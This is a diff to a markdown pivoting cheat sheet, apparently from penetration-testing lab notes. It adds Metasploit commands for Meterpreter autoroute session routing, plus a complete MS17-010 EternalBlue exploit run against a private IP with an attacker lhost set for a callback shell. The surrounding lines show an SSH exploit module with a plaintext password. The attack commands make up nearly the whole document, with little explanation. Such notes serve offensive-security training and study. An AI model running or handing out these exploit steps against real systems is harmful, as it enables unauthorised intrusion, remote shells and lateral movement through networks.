@@ -85,7 +85,7 @@ SSH Local Port Forwarding /w Jump Host
 Meterpreter Session Routing
 ---
 
-    1.MSF
+    MSF
     msfconsole
     use exploit/multi/ssh/sshexec
     set rhosts 172.19.19.70
@@ -93,4 +93,25 @@ Meterpreter Session Routing
     set password Infinit3
     set lhost 172.19.19.18
     exploit
+![image](https://github.com/user-attachments/assets/39ebb9d0-4c7e-484a-b5f0-3402bec8f936)
+
+    Meterpreter (Session-Routing)
+    run post/multi/manage/autoroute OPTION=s
+    run autoroute -p
+    background
+![image](https://github.com/user-attachments/assets/49ac4283-9f80-4fb3-83fc-70ab73e29d4a)
+
+    MS17_010
+    search ms17_010
+    use exploit/windows/smb/ms17_010_eternalblue
+    show options
+    set rhosts 192.168.0.7
+    set lhost 172.19.19.18
+    check
+    exploit
+![image](https://github.com/user-attachments/assets/0c80c931-43b2-4000-8b86-45713904e61b)
+
+Datapipe
+---
+[datapipe](https://github.com/bovine/datapipe/blob/master/datapipe.c) 
 
